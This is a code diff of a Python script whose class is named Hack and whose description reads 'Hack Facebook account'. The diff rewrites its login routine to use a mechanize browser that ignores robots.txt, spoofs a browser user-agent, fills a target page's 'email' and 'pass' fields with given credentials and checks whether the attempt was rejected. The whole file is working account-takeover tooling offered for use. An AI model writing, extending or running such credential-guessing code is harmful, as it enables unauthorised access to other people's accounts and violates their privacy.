@@ -1,5 +1,8 @@
 import requests
 import argparse
+import re
+import urllib3
+import mechanize
 from bs4 import BeautifulSoup
 
 class Hack():
@@ -10,37 +13,39 @@ class Hack():
 
 
     def _get_website(self):
-        try:
-            session = requests.Session()
+        br = mechanize.Browser()
 
-            response = session.get(self.__url)
+        br.set_handle_robots(False)
+        br.set_handle_refresh(False)
+        
+        br.addheaders = [("User-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3")]
 
-            if response.status_code == 200:
-                soup = BeautifulSoup(response.content, "html.parser")
-                inputs = soup.find_all("input")
-                
-                self.__start_hacking(session, inputs)
-            
-        except requests.exceptions.ConnectionError:
-            print(f"\n[-] No website found with url {self.__url}!\n")
+        response = br.open(self.__url)
 
+        self.__start_hacking(br, response)
     
-    def __start_hacking(self, session, inputs):
-        data = {}
-        for input in inputs:
-            if input.has_attr("value"):
-                data[input["name"]] = input["value"]
 
-        data["email"] = self.__username
-        data["pass"] = self.__password
+    def __start_hacking(self, br, response):
+        br.form = list(br.forms())[0]
 
-        response = session.post(self.__url, data=data)
+        email_control = br.form.find_control("email")
+        password_control = br.form.find_control("pass")
 
-        if "Log out" in response.text:
-            print(f"[+] Login successful at username: {self.__username} & password: {self.__password}!\n")
+        email_control.value = self.__username
+        password_control.value = self.__password
+
+        response = br.submit()
+
+        soup = BeautifulSoup(response,'html.parser')
+
+        element = soup.find("h2", string="Your Request Couldn't be Processed")
+
+        if element:
+            print("[-] " + element.text)
         else:
-            print(f"[-] Login unsuccessful!\n")
+            print("OK")
 
+        
 
 def start():
     parser = argparse.ArgumentParser(description="Hack Facebook account")
